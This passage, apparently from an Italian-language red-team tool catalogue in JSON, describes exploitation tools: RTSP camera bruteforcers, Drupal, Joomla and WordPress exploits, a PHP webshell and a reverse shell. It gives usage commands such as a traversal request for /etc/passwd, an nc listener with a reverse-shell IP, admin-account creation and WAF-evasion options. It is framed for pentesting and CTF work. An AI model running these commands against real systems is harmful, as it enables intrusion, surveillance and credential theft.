      "RTSP"
    ],
    "notes": null
  },
  {
    "id": "rtsp-digest-auth-bruteforcer",
    "name": "RTSP-Digest-Auth-Bruteforcer",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Script specializzato per attaccare l'autenticazione Digest (più sicura della Basic) su stream RTSP tramite dizionario.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Questo tool nasce per colmare una lacuna specifica: molti bruteforcer RTSP supportano solo l'autenticazione \"Basic\" (in chiaro). <strong>rtsp-digest-auth-bruteforcer</strong> è progettato per gestire il challenge-response dell'autenticazione Digest, calcolando correttamente gli hash MD5 necessari per ogni tentativo di password. È essenziale contro telecamere IP moderne o configurate con livelli di sicurezza più elevati dove i tool generici falliscono.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Digest Handling:</strong> Intercetta il nonce fornito dal server e genera la risposta hash valida per ogni password della wordlist, automatizzando il processo matematico del protocollo.</p><p><strong>Targeting Mirato:</strong> Ottimizzato per colpire singoli flussi video persistenti, ideale per \"aprire\" una telecamera specifica individuata durante la ricognizione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede Python e una lista di credenziali.</p><pre><code># Attacco su target specifico con user 'admin'\npython3 rtsp-digest-brute.py -u rtsp://192.168.1.50:554/live -U admin -W passwords.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>High-Security IoT Audit:</strong> Quando Nmap segnala la porta 554 aperta ma Hydra o altri tool falliscono perché il dispositivo rifiuta l'auth Basic. Questo script permette di testare la robustezza delle password anche sotto auth Digest.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'autenticazione Digest richiede più pacchetti (4-way handshake) rispetto alla Basic, rendendo l'attacco più lento e più rumoroso a livello di traffico di rete.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "RTSP"
    ],
    "notes": null
  },
  {
    "id": "rtsp-findingsomefun",
    "name": "RTSP-FindingSomeFun",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/ThatNotEasy/RTSP-FindingSomeFun",
    "desc": "Scanner RTSP massivo multi-thread per discovery di porte 554 e bruteforce simultaneo di path e credenziali.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>RTSP-FindingSomeFun</strong> è uno strumento aggressivo di discovery pensato per scansionare ampi range di indirizzi IP (o l'intera internet). Combina un port scanner veloce con un motore di bruteforce per identificare telecamere esposte. La sua caratteristica distintiva è la velocità: utilizza il multithreading spinto per verificare migliaia di host, cercando di indovinare sia il percorso dello stream (es. <code>/live.sdp</code>) che le credenziali di accesso in un unico passaggio.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Mass Scanning:</strong> Accetta in input liste di IP o range CIDR, ignorando rapidamente gli host chiusi per concentrarsi sulle porte 554 attive.</p><p><strong>Smart Brute:</strong> Testa combinazioni di credenziali di default (admin/admin, admin/12345) e path comuni specifici per vendor (Hikvision, Dahua), massimizzando le probabilità di successo su device non configurati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Clonare la repo e lanciare lo script principale.</p><pre><code># Scansione da lista IP\npython3 rtsp.py -i ip_list.txt -t 500\n\n# Scansione range con output personalizzato\npython3 rtsp.py -r 192.168.0.0/16 --output found.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Large Scale Recon:</strong> Ideale per mappare la superficie d'attacco IoT di un'intera organizzazione o città. Permette di trovare rapidamente dispositivi dimenticati o installati da terzi senza autorizzazione (Shadow IT).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Estremamente rumoroso (\"Noisy\"). Genera un volume di traffico che viene immediatamente flaggato da firewall e IPS come scansione ostile.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "RTSP"
    ],
    "notes": null
  },
  {
    "id": "rtspscanner",
    "name": "RTSPScanner",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/BeardedTek-com/RTSPScanner",
    "desc": "Utility Python per enumerare stream RTSP su intere subnet, verificare percorsi comuni e catturare screenshot di anteprima.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>RTSPScanner</strong> è uno strumento progettato per la ricognizione di dispositivi IoT e telecamere di sicurezza che espongono il protocollo Real Time Streaming Protocol (RTSP). A differenza di un semplice port scanner, questo tool tenta attivamente di connettersi al servizio sulla porta 554 (o custom) e bruteforza i percorsi delle risorse (es. <code>/live</code>, <code>/h264</code>) per verificare l'accesso allo stream video, spesso non protetto da autenticazione.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Mass Scanning:</strong> Accetta in input range CIDR o liste di IP e scansiona rapidamente la porta 554 in multithreading. È ottimizzato per gestire timeout brevi, permettendo di analizzare vaste reti IoT in tempi ridotti.</p><p><strong>Path Brute-forcing:</strong> Una volta rilevata una porta aperta, itera attraverso un dizionario interno di percorsi RTSP comuni (utilizzati da vendor come Hikvision, Dahua, Axis) per individuare l'URL esatto dello stream.</p><p><strong>Verifica Accesso:</strong> Tenta di stabilire una connessione allo stream. Se il server risponde positivamente (200 OK) senza richiedere credenziali, il tool lo segnala come vulnerabile e può tentare di salvare un frame immagine come prova (screenshot).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede Python e le dipendenze installate. L'input può essere un singolo IP o una subnet.</p><pre><code># Scansione di una subnet locale\npython3 RTSPScanner.py -t 192.168.1.0/24\n\n# Scansione con output su file e screenshot attivi\npython3 RTSPScanner.py -t targets.txt --screenshot --output results.json</code></pre><p>I risultati vengono forniti in formato strutturato, indicando IP, porta, path valido ed eventuale screenshot catturato nella cartella di output.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In un <strong>Physical Security Assessment</strong>, permette di dimostrare come un attaccante possa spiare i feed video aziendali senza autenticazione.</p><p>Durante un <strong>Internal Pentest</strong>, le telecamere sono spesso VLAN-hop points o dispositivi embedded con firmware non patchati che possono essere usati come pivot.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le connessioni RTSP fallite o i tentativi di indovinare il path generano log sugli NVR e sulle telecamere. Il traffico di rete è facilmente identificabile.</p><p><strong>Impatto operativo:</strong> Tentativi eccessivi su dispositivi low-power (vecchie IP camera) possono causare il freeze del servizio video o il riavvio del dispositivo.</p><p><strong>Mitigazioni:</strong> Limitare il numero di thread. Non eseguire screenshot massivi se la banda è limitata.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "RTSP"
    ],
    "notes": null
  },
  {
    "id": "drupalgeddon",
    "name": "drupalgeddon",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Script di exploit per CVE-2014-3704 (SQL Injection) su Drupal 7 che permette Admin Account Takeover e successiva RCE.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Drupalgeddon</strong> (v1) è l'exploit per la storica vulnerabilità di SQL Injection pre-auth in Drupal 7. A differenza del suo successore (Drupalgeddon2 che è RCE diretto), questo script sfrutta la manipolazione degli array nei parametri POST per iniettare query SQL arbitrarie. L'obiettivo primario è sovrascrivere le sessioni o creare un nuovo utente amministratore nel database, garantendo il controllo totale del CMS.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Admin Creation:</strong> Inietta comandi SQL per inserire un nuovo utente con privilegi 'administrator' nella tabella <code>users</code>.</p><p><strong>Remote Code Execution:</strong> Una volta ottenuto l'accesso amministrativo, lo script può automatizzare l'abilitazione del modulo 'PHP Filter' per eseguire codice PHP arbitrario sul server.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Eseguire lo script (spesso ruby o python) contro l'URL del sito Drupal.</p><pre><code># Creazione admin (user: pwned / pass: pwned)\n./drupalgeddon.rb -t https://target.com -u pwned -p pwned\n\n# Reset password admin esistente (distruttivo)\n./drupalgeddon.rb -t https://target.com --reset-admin</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Legacy System Assessment:</strong> Utile su vecchie installazioni Drupal 7 interne o abbandonate che non sono state patchate dopo il 2014. Spesso presente in esercizi CTF.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'iniezione SQL lascia tracce evidenti nei log del database e degli errori HTTP. La creazione di utenti admin è un evento ad alta visibilità.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "CMS_Exploits",
      "Drupal"
    ],
    "notes": null
  },
  {
    "id": "drupalgeddon2",
    "name": "drupalgeddon2",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/dreadlocked/Drupalgeddon2",
    "desc": "Exploit script per CVE-2018-7600 (Drupalgeddon2), vulnerabilità critica RCE su Drupal 7/8 non autenticato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Drupalgeddon2</strong> è uno script di exploit per una delle vulnerabilità più gravi della storia di Drupal. Sfrutta una mancata sanitizzazione nei parametri delle Form API di Drupal (AJAX requests), permettendo a un attaccante remoto non autenticato di iniettare ed eseguire comandi di sistema arbitrari. L'exploit è altamente affidabile e colpisce installazioni default.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Unauthenticated RCE:</strong> Non richiede credenziali. Sfrutta i parametri <code>#post_render</code> o simili per passare comandi PHP/Shell.</p><p><strong>Auto-Detection:</strong> Identifica se il target è vulnerabile prima di lanciare il payload distruttivo, verificando la versione e la risposta alle richieste AJAX manipolate.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lanciare lo script Ruby o Python contro l'URL base.</p><pre><code># Verifica e exploit (ottiene shell o esegue comando)\nruby drupalgeddon2.rb https://vulnerable-drupal.com\n\n# Esecuzione comando specifico\npython3 drupal7-cve-2018-7600.py -c \"id\" https://target.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>External Pentest</strong>, trovare un Drupal non patchato equivale a ottenere accesso al server web. Utile anche in CTF e ambienti legacy. La vulnerabilità è vecchia ma ancora presente in siti abbandonati o intranet.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I payload sono facilmente firmatbili da IDS/WAF. L'esecuzione lascia log evidenti nelle richieste HTTP POST.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "CMS_Exploits",
      "Drupal"
    ],
    "notes": null
  },
  {
    "id": "joomla-bruteforce",
    "name": "joomla-bruteforce",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/ajnik/joomla-bruteforce",
    "desc": "Script multi-thread per attacchi a dizionario contro pannelli di login Joomla, con supporto per evasione token CSRF.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Questo tool è uno specialista nel cracking delle credenziali di amministrazione di Joomla. A differenza dei bruteforcer generici (come Hydra), questo script è consapevole della logica di Joomla: estrae e rinvia automaticamente il \"security token\" (CSRF token) richiesto dal CMS ad ogni tentativo di login, garantendo che i tentativi non vengano scartati silenziosamente dal server.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Token Handling:</strong> Effettua il parsing dell'HTML della pagina di login per trovare il campo hidden randomico e lo include nella richiesta POST successiva.</p><p><strong>Multithreading:</strong> Permette di testare centinaia di combinazioni al secondo.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede wordlist utenti e password.</p><pre><code># Attacco standard\npython3 joomla-brute.py -u http://target.com/administrator -w passwords.txt -user admin</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Web Pentest:</strong> Quando si identifica un Joomla esposto, spesso l'account 'admin' ha password deboli. Questo tool è necessario perché Hydra spesso fallisce contro i token CSRF di Joomla.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Genera migliaia di log di errore 403/200. Facilmente bloccato da plugin come Akeeba Admin Tools o WAF.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "CMS_Exploits",
      "Joomla"
    ],
    "notes": null
  },
  {
    "id": "joomla-dir-traversal",
    "name": "joomla_dir_trav.py",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Script Python per sfruttare vulnerabilità di Directory Traversal nel core di Joomla (es. CVE-2019-10945) ed estrarre file di configurazione.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Questo script automatizza lo sfruttamento di vulnerabilità di path traversal note nel core di Joomla (come quelle che affliggono versioni da 1.5 a 3.9). La vulnerabilità spesso risiede in componenti come <code>com_media</code> che non filtrano adeguatamente l'input utente nei parametri dei percorsi file. Il tool permette di leggere file sensibili come <code>configuration.php</code> fuori dalla root web.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Config Extraction:</strong> Mira specificamente al file di configurazione di Joomla per estrarre le credenziali del database e le chiavi segrete.</p><p><strong>Evasione Filtri:</strong> Implementa tecniche di bypass comuni per il traversal, come l'uso di encoding URL o path troncati per aggirare controlli di base.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Eseguire lo script specificando l'URL base di Joomla.</p><pre><code># Tentativo di lettura configuration.php\npython3 joomla_dir_trav.py --url http://target.com --file ../configuration.php</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Legacy CMS Audit:</strong> Efficace su installazioni Joomla non aggiornate. L'accesso al file di configurazione garantisce quasi sempre l'accesso al database o la possibilità di creare una sessione admin.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Pattern <code>../</code> nell'URL sono altamente sospetti e loggati. I moderni WAF bloccano questi tentativi di default.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "CMS_Exploits",
      "Joomla"
    ],
    "notes": null
  },
  {
    "id": "wp-cve-2024-9047",
    "name": "CVE-2024-9047",
    "version": "2024-9047",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Exploit per vulnerabilità critica Path Traversal nel plugin WordPress \"File Upload\" che consente lettura/cancellazione file arbitrari.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>CVE-2024-9047</strong> è una vulnerabilità ad alto impatto (CVSS 9.8) che colpisce il plugin \"WordPress File Upload\" (versioni <= 4.24.11). La falla risiede nella mancata sanitizzazione dei percorsi nel file <code>wfu_file_downloader.php</code>, permettendo a un attaccante non autenticato di leggere file sensibili (come <code>wp-config.php</code>) o cancellare file di sistema arbitrari, portando spesso alla compromissione totale del sito tramite estrazione di credenziali database o Denial of Service.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Arbitrary File Read:</strong> Sfrutta sequenze di path traversal (<code>../</code>) per evadere la directory di upload e scaricare file di configurazione critici contenenti salt, chiavi segrete e password database.</p><p><strong>Arbitrary File Deletion:</strong> Oltre alla lettura, l'exploit può essere adattato per cancellare file vitali per il funzionamento del server, causando un crash immediato dell'applicazione web.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lanciare lo script Python contro il target specificando il file da leggere.</p><pre><code># Lettura wp-config.php\npython3 exploit_cve_2024_9047.py -u https://target.com -f /var/www/html/wp-config.php\n\n# Verifica vulnerabilità (check non invasivo)\ncurl -v \"https://target.com/wp-content/plugins/wp-file-upload/wfu_file_downloader.php?file=../../../../etc/passwd\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Web App Pentest:</strong> Durante l'analisi di siti WordPress, questa CVE offre un vettore di accesso immediato (Initial Access) senza necessità di credenziali. È particolarmente efficace perché il plugin è molto diffuso (oltre 100k installazioni).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le richieste HTTP contenenti <code>../</code> o percorsi assoluti sono facilmente rilevabili dai WAF. I log di accesso mostreranno chiamate anomale a <code>wfu_file_downloader.php</code>.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "CMS_Exploits",
      "WordPress"
    ],
    "notes": null
  },
  {
    "id": "wp-wpdiscuz-rce",
    "name": "RCE - wpDiscuz",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://www.exploit-db.com/exploits/49967",
    "desc": "Exploit per vulnerabilità Critical RCE nel plugin wpDiscuz (CVE-2020-24186) tramite upload immagini non sanitizzato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Questa vulnerabilità colpisce il popolare plugin di commenti wpDiscuz (versioni 7.0.0 - 7.0.4). Il plugin permetteva agli utenti di caricare immagini nei commenti, ma controllava solo l'estensione del file e non il contenuto o l'intestazione MIME type in modo sicuro. Un attaccante può caricare un file PHP mascherato (es. con magic bytes GIF) che viene salvato sul server ed eseguibile, portando a Remote Code Execution.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Upload Bypass:</strong> Carica un file con estensione doppia o spoofata che contiene payload PHP, aggirando i controlli lato client/server.</p><p><strong>Execution:</strong> Recupera il path del file caricato dalla risposta AJAX e lo invoca per eseguire la shell.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Script Python o modulo Metasploit.</p><pre><code># Exploit automatico (ottiene shell)\npython3 wpDiscuz_RCE.py -u https://target.com -p /blog-post-url\n\n# Metasploit\nuse exploit/unix/webapp/wp_wpdiscuz_unauthenticated_file_upload</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Web Pentest:</strong> Vettore di ingresso molto comune nel 2020/2021. Utile per dimostrare l'importanza di disabilitare l'esecuzione di script nelle directory di upload (hardening).</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Vulnerabilità patchata nelle versioni recenti. Rischio alto di lasciare shell accessibili pubblicamente se non rimossi i file.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "CMS_Exploits",
      "WordPress"
    ],
    "notes": null
  },
  {
    "id": "wpxploit-1-0-0",
    "name": "wpxploit",
    "version": "1.0.0",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/relarizky/wpxploit",
    "desc": "Scanner di vulnerabilità WordPress automatizzato che controlla versioni core, temi e plugin contro database exploit noti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>WPXploit</strong> è uno scanner di vulnerabilità automatizzato specifico per WordPress, progettato per identificare rapidamente debolezze di sicurezza in installazioni WP. Il tool esegue fingerprinting passivo e attivo dell'installazione target, rilevando versioni del core WordPress, temi installati e plugin attivi, per poi confrontarli con database di vulnerabilità note come Exploit-DB e WPVulnDB. È particolarmente efficace nel trovare installazioni obsolete con CVE pubbliche sfruttabili.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Version Fingerprinting:</strong> Identifica la versione esatta di WordPress analizzando meta tag, feed RSS, file readme e hash di file statici. Questa precisione è fondamentale per mappare le CVE applicabili alla specifica installazione.</p><p><strong>Plugin & Theme Enumeration:</strong> Enumera plugin e temi installati attraverso tecniche multiple: analisi del codice sorgente HTML, bruteforce di path comuni, e rilevamento di file readme.txt e changelog. Ogni componente trovato viene verificato contro database di exploit noti.</p><p><strong>User Enumeration:</strong> Estrae username validi tramite REST API (/wp-json/wp/v2/users), author archives (?author=N) e login error analysis, fornendo una lista di target per attacchi di password spraying.</p><p><strong>Backup & Config Discovery:</strong> Cerca file di backup esposti (.sql, .zip, .tar.gz), configurazioni wp-config.php.bak e directory listing abilitate che potrebbero esporre dati sensibili.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>WPXploit è uno script Python che richiede Python 3 e le dipendenze specificate nel repository.</p><pre><code># Scansione completa di un target\npython3 wpxploit.py --url https://target.com\n\n# Enumerazione solo plugin\npython3 wpxploit.py --url https://target.com --plugins\n\n# Enumerazione utenti\npython3 wpxploit.py --url https://target.com --users\n\n# Output verboso con dettagli CVE\npython3 wpxploit.py --url https://target.com -v</code></pre><p>I risultati includono riferimenti diretti a Exploit-DB con link ai PoC disponibili per le vulnerabilità identificate.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>Web Application Assessment</strong>, WPXploit fornisce una valutazione rapida della postura di sicurezza di siti WordPress, ideale per audit iniziali o verifiche periodiche.</p><p>Durante attività di <strong>Bug Bounty</strong>, permette di identificare velocemente target WordPress vulnerabili in scope ampi, prioritizzando quelli con CVE note e exploit pubblici.</p><p>Per <strong>Vulnerability Management</strong>, i team IT possono usarlo per verificare che le installazioni WordPress aziendali siano aggiornate e prive di componenti vulnerabili noti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> La scansione genera traffico HTTP visibile nei log del web server. L'enumerazione di plugin tramite bruteforce produce molte richieste 404 che possono triggerare alert WAF o rate limiting.</p><p><strong>Impatto:</strong> Tool di sola lettura, non esegue exploit attivi. Non causa danni al target ma l'attività è facilmente riconducibile all'IP sorgente.</p><p><strong>Mitigazioni:</strong> Utilizzare proxy o VPN per anonimizzare la sorgente. Considerare WPScan come alternativa più completa e attivamente mantenuta per assessment professionali.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "CMS_Exploits",
      "WordPress"
    ],
    "notes": null
  },
  {
    "id": "wpxstrike",
    "name": "WPXStrike",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/nowak0x01/WPXStrike",
    "desc": "Tool moderno per WordPress Recon e Exploit con focus su enumerazione aggressiva e rilevamento WAF.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>WPXStrike</strong> è un framework offensivo moderno per WordPress che combina ricognizione avanzata e capacità di exploitation in un unico strumento. A differenza degli scanner passivi, WPXStrike adotta un approccio aggressivo all'enumerazione, includendo moduli specifici per il rilevamento e bypass di WAF (Web Application Firewall), tecniche di evasione e automazione di attacchi comuni come XML-RPC abuse e credential stuffing. È ottimizzato per operazioni di red team e bug bounty su larga scala.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>WAF Detection & Fingerprinting:</strong> Identifica la presenza di WAF come Cloudflare, Sucuri, Wordfence e ModSecurity analizzando header HTTP, comportamenti di blocco e response patterns. Questa informazione è cruciale per adattare le tecniche di attacco ed evitare ban immediati.</p><p><strong>XML-RPC Exploitation:</strong> Sfrutta l'endpoint xmlrpc.php per attacchi di credential bruteforce amplificato (system.multicall), pingback SSRF e user enumeration. Include payload ottimizzati per massimizzare i tentativi per richiesta aggirando rate limiting basilari.</p><p><strong>Aggressive Enumeration:</strong> Esegue crawling profondo del sito per scoprire plugin, temi, file di configurazione esposti e endpoint nascosti. Utilizza wordlist estese e tecniche di fuzzing per identificare risorse non linkate.</p><p><strong>Login Bruteforce:</strong> Modulo dedicato per attacchi a wp-login.php con supporto per proxy rotation, custom headers e delay configurabili per evadere protezioni anti-bot.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>WPXStrike è uno script Python con interfaccia CLI ricca di opzioni per personalizzare l'aggressività della scansione.</p><pre><code># Scan completo con crawling\npython3 wpxstrike.py -u https://target.com --crawl\n\n# Rilevamento WAF\npython3 wpxstrike.py -u https://target.com --waf-detect\n\n# Enumerazione utenti via XML-RPC\npython3 wpxstrike.py -u https://target.com --xmlrpc-enum\n\n# Bruteforce credenziali con wordlist\npython3 wpxstrike.py -u https://target.com --brute -U users.txt -P passwords.txt\n\n# Scan stealth con delay\npython3 wpxstrike.py -u https://target.com --delay 2 --random-agent</code></pre><p>L'output include report dettagliati con severity rating per ogni finding e suggerimenti per l'exploitation manuale.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>Bug Bounty</strong>, WPXStrike eccelle nell'automazione della fase di discovery su programmi con molti asset WordPress, identificando rapidamente installazioni vulnerabili e misconfigurazioni sfruttabili.</p><p>Durante operazioni di <strong>Red Team</strong>, il modulo di WAF detection permette di adattare le tecniche di attacco all'infrastruttura difensiva presente, aumentando le probabilità di successo.</p><p>Per <strong>Penetration Testing</strong> di applicazioni WordPress custom, la combinazione di crawling aggressivo e fuzzing rivela funzionalità nascoste e endpoint non documentati che potrebbero sfuggire a scanner più conservativi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> WPXStrike è intrinsecamente rumoroso. La modalità aggressiva genera centinaia di richieste HTTP in breve tempo, producendo picchi di 404/403 nei log e potenzialmente triggerando ban IP automatici da parte di WAF e plugin di sicurezza WordPress.</p><p><strong>Impatto:</strong> Gli attacchi XML-RPC multicall possono sovraccaricare server poco performanti. Il bruteforce può causare lockout di account legittimi se il target implementa protezioni.</p><p><strong>Mitigazioni:</strong> Utilizzare sempre le opzioni --delay e --random-agent in ambienti di produzione. Ruotare gli IP sorgente tramite proxy pool. Verificare le regole di ingaggio prima di lanciare moduli di exploitation attivo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "CMS_Exploits",
      "WordPress"
    ],
    "notes": null
  },
  {
    "id": "phpbash",
    "name": "phpbash",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/Arrexel/phpbash",
    "desc": "Webshell PHP con interfaccia terminale simulata nel browser, utile quando non è possibile stabilire connessioni reverse.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PHPBash</strong> è una webshell standalone che simula un terminale bash direttamente nel browser. A differenza di una reverse shell che richiede una connessione in uscita verso l'attaccante (spesso bloccata dai firewall), PHPBash funziona interamente sopra HTTP (request/response), permettendo di navigare il file system ed eseguire comandi in modo interattivo e visivo anche in ambienti di rete restrittivi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Firewall Bypass:</strong> Non richiede porte in uscita aperte o connessioni TCP dirette. Tutto il traffico è HTTP standard sulla porta 80/443.</p><p><strong>UI Intuitiva:</strong> Mantiene la directory corrente (cd funziona grazie alla gestione sessione) e mostra l'output colorato, simulando una vera esperienza terminale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Caricare il file <code>phpbash.php</code> sul server e visitarlo.</p><pre><code># Navigazione browser\nhttp://target.com/uploads/phpbash.php</code></pre><p>Si aprirà una pagina web con un prompt nero dove digitare comandi.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Restricted Networks:</strong> Quando una reverse shell fallisce perché il server target non può connettersi a Internet o all'IP attaccante. PHPBash fornisce un'alternativa immediata per l'enumerazione.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I log web mostreranno molte richieste POST verso lo stesso file PHP. Non è persistente e l'accesso è visibile a chiunque conosca l'URL.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "File_Upload"
    ],
    "notes": null
  },
  {
    "id": "php-reverse-shell",
    "name": "php-reverse-shell",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/pentestmonkey/php-reverse-shell",
    "desc": "La classica reverse shell in PHP di PentestMonkey: file singolo per ottenere accesso remoto da server web vulnerabili.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Lo script PHP Reverse Shell di PentestMonkey è probabilmente il file più caricato nella storia del web pentesting. È uno script PHP autonomo che, quando visitato via browser, apre una connessione TCP in uscita verso l'IP dell'attaccante e vi collega una shell interattiva (<code>/bin/sh</code>). È il payload standard per sfruttare vulnerabilità di File Upload o RCE su stack LAMP.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Robustezza:</strong> Tenta di usare diversi metodi per eseguire comandi (<code>exec</code>, <code>shell_exec</code>, <code>system</code>, <code>passthru</code>) bypassando alcune restrizioni di configurazione PHP.</p><p><strong>Configurabilità:</strong> Basta modificare due variabili all'inizio del file (IP e PORTA) per renderlo pronto all'uso.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Modificare il file e caricarlo sul target.</p><pre><code># Modifica variabili\n$ip = '10.10.14.5'; $port = 1234;\n\n# Listener locale (attaccante)\nnc -lvnp 1234\n\n# Trigger (visitando l'URL)\ncurl http://target.com/uploads/shell.php</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Exploitation Web:</strong> Ogni volta che si trova un form di upload non sicuro o una RCE, questo è il payload per trasformare l'accesso web in accesso al sistema operativo.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Gli antivirus rilevano questo file staticamente immediatamente. Il traffico di reverse shell in chiaro è rilevabile da IDS.</p><p><strong>Mitigazioni:</strong> Usare versioni offuscate (es. Weevely) o cifrate se l'AV è presente.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "File_Upload"
    ],
    "notes": null
  },
  {
    "id": "tomcat-cmd-jsp",
    "name": "Tomcat_cmd.jsp",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
